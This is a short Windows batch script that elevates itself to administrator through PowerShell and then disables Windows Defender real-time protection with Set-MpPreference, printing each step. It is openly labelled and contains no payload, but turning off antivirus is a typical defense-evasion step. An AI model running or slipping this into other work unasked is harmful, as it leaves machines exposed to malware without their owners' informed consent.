@echo off
:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

echo Running with admin rights...
echo Disabling Windows Defender Real-time Protection...
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
echo Done.
pause
